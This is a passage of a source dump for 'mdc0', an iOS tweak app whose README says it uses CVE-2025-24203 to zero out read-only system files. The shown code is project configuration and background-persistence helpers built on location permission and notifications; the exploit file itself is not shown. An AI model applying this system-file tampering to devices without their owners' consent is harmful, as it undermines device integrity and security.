Project Path: arc_34306_mdc0_lpv1c5b7

Source Tree:

```txt
arc_34306_mdc0_lpv1c5b7
‚îú‚îÄ‚îÄ README.md
‚îú‚îÄ‚îÄ mdc0
‚îÇ   ‚îú‚îÄ‚îÄ Assets.xcassets
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ AccentColor.colorset
‚îÇ   ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ Contents.json
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ AppIcon.appiconset
‚îÇ   ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ Contents.json
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ Contents.json
‚îÇ   ‚îú‚îÄ‚îÄ Clip
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ ApplicationMonitor.swift
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ LocationManager.swift
‚îÇ   ‚îú‚îÄ‚îÄ ContentView.swift
‚îÇ   ‚îú‚îÄ‚îÄ GitHubUpdater.swift
‚îÇ   ‚îú‚îÄ‚îÄ Info.plist
‚îÇ   ‚îú‚îÄ‚îÄ Modules
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ CreditView.swift
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ DisableCallRecordNoticeView.swift
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ HideDockView.swift
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ HideHomeBarView.swift
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ LiquidDetectionView.swift
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ LockscreenIconView.swift
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ ModuleCard.swift
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ RemoveAppSwitcherBlurView.swift
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ RemovePasscodeThemeView.swift
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ ShutterSoundView.swift
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ Status.swift
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ StatusBarOverrideView.swift
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ Transparent.swift
‚îÇ   ‚îú‚îÄ‚îÄ Preview Content
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ Preview Assets.xcassets
‚îÇ   ‚îÇ       ‚îî‚îÄ‚îÄ Contents.json
‚îÇ   ‚îú‚îÄ‚îÄ Utils.swift
‚îÇ   ‚îú‚îÄ‚îÄ mdc0-Bridging-Header.h
‚îÇ   ‚îú‚îÄ‚îÄ mdc0App.swift
‚îÇ   ‚îî‚îÄ‚îÄ poc.c
‚îî‚îÄ‚îÄ mdc0.xcodeproj
    ‚îú‚îÄ‚îÄ project.pbxproj
    ‚îú‚îÄ‚îÄ project.xcworkspace
    ‚îÇ   ‚îú‚îÄ‚îÄ contents.xcworkspacedata
    ‚îÇ   ‚îú‚îÄ‚îÄ xcshareddata
    ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ swiftpm
    ‚îÇ   ‚îÇ       ‚îî‚îÄ‚îÄ Package.resolved
    ‚îÇ   ‚îî‚îÄ‚îÄ xcuserdata
    ‚îÇ       ‚îú‚îÄ‚îÄ huynguyen.xcuserdatad
    ‚îÇ       ‚îÇ   ‚îî‚îÄ‚îÄ UserInterfaceState.xcuserstate
    ‚îÇ       ‚îú‚îÄ‚îÄ mini.xcuserdatad
    ‚îÇ       ‚îÇ   ‚îî‚îÄ‚îÄ UserInterfaceState.xcuserstate
    ‚îÇ       ‚îî‚îÄ‚îÄ timi2506.xcuserdatad
    ‚îÇ           ‚îî‚îÄ‚îÄ UserInterfaceState.xcuserstate
    ‚îî‚îÄ‚îÄ xcuserdata
        ‚îú‚îÄ‚îÄ huynguyen.xcuserdatad
        ‚îÇ   ‚îî‚îÄ‚îÄ xcschemes
        ‚îÇ       ‚îî‚îÄ‚îÄ xcschememanagement.plist
        ‚îú‚îÄ‚îÄ mini.xcuserdatad
        ‚îÇ   ‚îú‚îÄ‚îÄ xcdebugger
        ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ Breakpoints_v2.xcbkptlist
        ‚îÇ   ‚îî‚îÄ‚îÄ xcschemes
        ‚îÇ       ‚îî‚îÄ‚îÄ xcschememanagement.plist
        ‚îî‚îÄ‚îÄ timi2506.xcuserdatad
            ‚îî‚îÄ‚îÄ xcschemes
                ‚îî‚îÄ‚îÄ xcschememanagement.plist

```

`README.md`:

```md
# MDC0
A random custom application for jailed user on iOS 15.0 up to 18.3.2

# Feature:
- Hide Dock Blur background
- Transparent Notification, Media Player and Folder background
- Hide Home Bar
- Hide Flash and Camera icon on Lockscreen
- Remove Blur in app switcher
- Disable camera shutter sound on J/A or KH/A devices (Restart camera app need to do it again)
- Remove passcode theme (may not work)
- The status bar thing (iOS 16 only)
- Disable call recording notification sound (iOS 18+)

Using CVE-2025-24203 by Ian Beer from Google TAG, this exploit "zero" out all of the files that's read-only in iOS system.

This app need a side-app to respring, you can download it [here](https://github.com/34306/mdc0/releases/download/1.0/respringapp.ipa)

Checking release to download the mdc0 app!

# Credit
- Ian Beer for the [exploit](https://project-zero.issues.chromium.org/issues/391518636)
- My old mdc/kfd stuff
- [timi2506](https://github.com/timi2506) and [straight-tamago](https://x.com/straight_tamago) for the UI
- [Thea](https://x.com/nyaathea) for the Respring app
- [DuyTran](https://github.com/khanhduytran0) for the Liquid status bar and fake status

```

`mdc0.xcodeproj/project.pbxproj`:

```pbxproj
// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		8D28EA292DCE555500139649 /* Drops in Frameworks */ = {isa = PBXBuildFile; productRef = 8D28EA282DCE555500139649 /* Drops */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		0005C51F2DCDEB1400E6A190 /* mdc0.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = mdc0.app; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		3D0314D72DD1765B00B38CF8 /* Exceptions for "mdc0" folder in "mdc0" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 0005C51E2DCDEB1400E6A190 /* mdc0 */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		0005C5212DCDEB1400E6A190 /* mdc0 */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				3D0314D72DD1765B00B38CF8 /* Exceptions for "mdc0" folder in "mdc0" target */,
			);
			path = mdc0;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		0005C51C2DCDEB1400E6A190 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8D28EA292DCE555500139649 /* Drops in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		0005C5162DCDEB1400E6A190 = {
			isa = PBXGroup;
			children = (
				0005C5212DCDEB1400E6A190 /* mdc0 */,
				0005C5202DCDEB1400E6A190 /* Products */,
			);
			sourceTree = "<group>";
		};
		0005C5202DCDEB1400E6A190 /* Products */ = {
			isa = PBXGroup;
			children = (
				0005C51F2DCDEB1400E6A190 /* mdc0.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		0005C51E2DCDEB1400E6A190 /* mdc0 */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 0005C52D2DCDEB1600E6A190 /* Build configuration list for PBXNativeTarget "mdc0" */;
			buildPhases = (
				0005C51B2DCDEB1400E6A190 /* Sources */,
				0005C51C2DCDEB1400E6A190 /* Frameworks */,
				0005C51D2DCDEB1400E6A190 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				0005C5212DCDEB1400E6A190 /* mdc0 */,
			);
			name = mdc0;
			packageProductDependencies = (
				8D28EA282DCE555500139649 /* Drops */,
			);
			productName = mdc0;
			productReference = 0005C51F2DCDEB1400E6A190 /* mdc0.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		0005C5172DCDEB1400E6A190 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1620;
				LastUpgradeCheck = 1620;
				TargetAttributes = {
					0005C51E2DCDEB1400E6A190 = {
						CreatedOnToolsVersion = 16.2;
						LastSwiftMigration = 1620;
					};
				};
			};
			buildConfigurationList = 0005C51A2DCDEB1400E6A190 /* Build configuration list for PBXProject "mdc0" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 0005C5162DCDEB1400E6A190;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				8D28EA272DCE555500139649 /* XCRemoteSwiftPackageReference "Drops" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 0005C5202DCDEB1400E6A190 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				0005C51E2DCDEB1400E6A190 /* mdc0 */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		0005C51D2DCDEB1400E6A190 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		0005C51B2DCDEB1400E6A190 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		0005C52B2DCDEB1600E6A190 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = YES;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		0005C52C2DCDEB1600E6A190 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = YES;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		0005C52E2DCDEB1600E6A190 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"mdc0/Preview Content\"";
				DEVELOPMENT_TEAM = "";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = mdc0/Info.plist;
				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 2.1;
				PRODUCT_BUNDLE_IDENTIFIER = com.34306.mdc0;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OBJC_BRIDGING_HEADER = "mdc0/mdc0-Bridging-Header.h";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		0005C52F2DCDEB1600E6A190 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"mdc0/Preview Content\"";
				DEVELOPMENT_TEAM = WQL5MJWHM6;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = mdc0/Info.plist;
				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 2.1;
				PRODUCT_BUNDLE_IDENTIFIER = com.34306.mdc0;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OBJC_BRIDGING_HEADER = "mdc0/mdc0-Bridging-Header.h";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		0005C51A2DCDEB1400E6A190 /* Build configuration list for PBXProject "mdc0" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				0005C52B2DCDEB1600E6A190 /* Debug */,
				0005C52C2DCDEB1600E6A190 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		0005C52D2DCDEB1600E6A190 /* Build configuration list for PBXNativeTarget "mdc0" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				0005C52E2DCDEB1600E6A190 /* Debug */,
				0005C52F2DCDEB1600E6A190 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		8D28EA272DCE555500139649 /* XCRemoteSwiftPackageReference "Drops" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/omaralbeik/Drops.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 1.7.0;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		8D28EA282DCE555500139649 /* Drops */ = {
			isa = XCSwiftPackageProductDependency;
			package = 8D28EA272DCE555500139649 /* XCRemoteSwiftPackageReference "Drops" */;
			productName = Drops;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 0005C5172DCDEB1400E6A190 /* Project object */;
}

```

`mdc0.xcodeproj/project.xcworkspace/contents.xcworkspacedata`:

```xcworkspacedata
<?xml version="1.0" encoding="UTF-8"?>
<Workspace
   version = "1.0">
   <FileRef
      location = "self:">
   </FileRef>
</Workspace>

```

`mdc0.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved`:

```resolved
{
  "originHash" : "124d6e8f73749f32eb22934dbfd80fb8dda299ab82d6ec5b1d48430e953a6c1c",
  "pins" : [
    {
      "identity" : "drops",
      "kind" : "remoteSourceControl",
      "location" : "https://github.com/omaralbeik/Drops.git",
      "state" : {
        "revision" : "a183ee6f79f21c940092a19c2cba756555422371",
        "version" : "1.7.0"
      }
    }
  ],
  "version" : 3
}

```

`mdc0.xcodeproj/xcuserdata/huynguyen.xcuserdatad/xcschemes/xcschememanagement.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>SchemeUserState</key>
	<dict>
		<key>mdc0.xcscheme_^#shared#^_</key>
		<dict>
			<key>orderHint</key>
			<integer>0</integer>
		</dict>
	</dict>
</dict>
</plist>

```

`mdc0.xcodeproj/xcuserdata/mini.xcuserdatad/xcdebugger/Breakpoints_v2.xcbkptlist`:

```xcbkptlist
<?xml version="1.0" encoding="UTF-8"?>
<Bucket
   uuid = "37408201-EE6B-40A5-841C-87E3C3B7A869"
   type = "1"
   version = "2.0">
</Bucket>

```

`mdc0.xcodeproj/xcuserdata/mini.xcuserdatad/xcschemes/xcschememanagement.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>SchemeUserState</key>
	<dict>
		<key>mdc0.xcscheme_^#shared#^_</key>
		<dict>
			<key>orderHint</key>
			<integer>0</integer>
		</dict>
	</dict>
</dict>
</plist>

```

`mdc0.xcodeproj/xcuserdata/timi2506.xcuserdatad/xcschemes/xcschememanagement.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>SchemeUserState</key>
	<dict>
		<key>mdc0.xcscheme_^#shared#^_</key>
		<dict>
			<key>orderHint</key>
			<integer>0</integer>
		</dict>
	</dict>
</dict>
</plist>

```

`mdc0/Assets.xcassets/AccentColor.colorset/Contents.json`:

```json
{
  "colors" : [
    {
      "idiom" : "universal"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`mdc0/Assets.xcassets/AppIcon.appiconset/Contents.json`:

```json
{
  "images" : [
    {
      "idiom" : "universal",
      "platform" : "ios",
      "size" : "1024x1024"
    },
    {
      "appearances" : [
        {
          "appearance" : "luminosity",
          "value" : "dark"
        }
      ],
      "idiom" : "universal",
      "platform" : "ios",
      "size" : "1024x1024"
    },
    {
      "appearances" : [
        {
          "appearance" : "luminosity",
          "value" : "tinted"
        }
      ],
      "idiom" : "universal",
      "platform" : "ios",
      "size" : "1024x1024"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`mdc0/Assets.xcassets/Contents.json`:

```json
{
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`mdc0/Clip/ApplicationMonitor.swift`:

```swift
//
//  ApplicationMonitor.swift
//  Clip
//
//  Created by Riley Testutüç® on 6/27/19.
//  Copyright ¬© 2019 Riley Testut. All rights reserved.
//

import UIKit
import AVFoundation
import UserNotifications
import Combine

private enum UserNotification: String
{
    case appStoppedRunning = "com.34306.mdc0.AppStoppedRunning"
}

private extension CFNotificationName
{
    static let altstoreRequestAppState: CFNotificationName = CFNotificationName("com.mdc0.RequestAppState.com.34306.mdc0" as CFString)
    static let altstoreAppIsRunning: CFNotificationName = CFNotificationName("com.mdc0.AppState.Running.com.34306.mdc0" as CFString)
}

private let ReceivedApplicationState: @convention(c) (CFNotificationCenter?, UnsafeMutableRawPointer?, CFNotificationName?, UnsafeRawPointer?, CFDictionary?) -> Void =
{ (center, observer, name, object, userInfo) in
    ApplicationMonitor.shared.receivedApplicationStateRequest()
}

class ApplicationMonitor
{
    static let shared = ApplicationMonitor()
    
//    let pasteboardMonitor = PasteboardMonitor()
    let locationManager = LocationManager()
    
    private(set) var isMonitoring = false
    
    private var backgroundTaskID: UIBackgroundTaskIdentifier?
}

extension ApplicationMonitor
{
    func start()
    {
        guard !self.isMonitoring else { return }
        self.isMonitoring = true
        
        self.cancelApplicationQuitNotification() // Cancel any notifications from a previous launch.
        self.scheduleApplicationQuitNotification()
        
        self.locationManager.start()
        self.registerForNotifications()
    }
    
    func stop() {
        self.cancelApplicationQuitNotification()
        self.locationManager.stop()
    }
}

private extension ApplicationMonitor
{
    func registerForNotifications()
    {
        let center = CFNotificationCenterGetDarwinNotifyCenter()
        CFNotificationCenterAddObserver(center, nil, ReceivedApplicationState, CFNotificationName.altstoreRequestAppState.rawValue, nil, .deliverImmediately)
    }
    
    func scheduleApplicationQuitNotification()
    {
        let delay = 5 as TimeInterval
        
        let content = UNMutableNotificationContent()
        content.title = NSLocalizedString("App Stopped Running", comment: "")
        content.body = NSLocalizedString("Tap this notification to resume.", comment: "")
        
        let trigger = UNTimeIntervalNotificationTrigger(timeInterval: delay + 1, repeats: false)
        
        let request = UNNotificationRequest(identifier: UserNotification.appStoppedRunning.rawValue, content: content, trigger: trigger)
        UNUserNotificationCenter.current().add(request)
        
        DispatchQueue.global().asyncAfter(deadline: .now() + delay) {
            // If app is still running at this point, we schedule another notification with same identifier.
            // This prevents the currently scheduled notification from displaying, and starts another countdown timer.
            self.scheduleApplicationQuitNotification()
        }
    }
    
    func cancelApplicationQuitNotification()
    {
        UNUserNotificationCenter.current().removePendingNotificationRequests(withIdentifiers: [UserNotification.appStoppedRunning.rawValue])
    }
    
    func sendNotification(title: String, message: String)
    {
        let content = UNMutableNotificationContent()
        content.title = title
        content.body = message
        
        let request = UNNotificationRequest(identifier: UUID().uuidString, content: content, trigger: nil)
        UNUserNotificationCenter.current().add(request)
    }
}

private extension ApplicationMonitor
{
    func receivedApplicationStateRequest()
    {
        guard UIApplication.shared.applicationState != .background else { return }
        
        let center = CFNotificationCenterGetDarwinNotifyCenter()
        CFNotificationCenterPostNotification(center!, CFNotificationName(CFNotificationName.altstoreAppIsRunning.rawValue), nil, nil, true)
    }
}

```

`mdc0/Clip/LocationManager.swift`:

```swift
//
//  LocationManager.swift
//  Clip
//
//  Created by Riley Testutüç® on 11/6/20.
//  Copyright ¬© 2020 Riley Testut. All rights reserved.
//

import CoreLocation
import Combine
import UIKit

extension LocationManager
{
    typealias Status = Result<Void, Swift.Error>
    
    enum Error: LocalizedError, RecoverableError
    {
        case requiresAlwaysAuthorization
        
        var failureReason: String? {
            switch self
            {
            case .requiresAlwaysAuthorization: return NSLocalizedString("mdc0 requires ‚ÄúAlways‚Äù location permission.", comment: "")
            }
        }
        
        var recoverySuggestion: String? {
            switch self
            {
            case .requiresAlwaysAuthorization: return NSLocalizedString("Please grant mdc0 ‚ÄúAlways‚Äù location permission in Settings so it can run in the background indefinitely.", comment: "")
            }
        }
        
        var recoveryOptions: [String] {
            switch self
            {
            case .requiresAlwaysAuthorization: return [NSLocalizedString("Open Settings", comment: "")]
            }
        }
        
        func attemptRecovery(optionIndex recoveryOptionIndex: Int) -> Bool
        {
            return false
        }
        
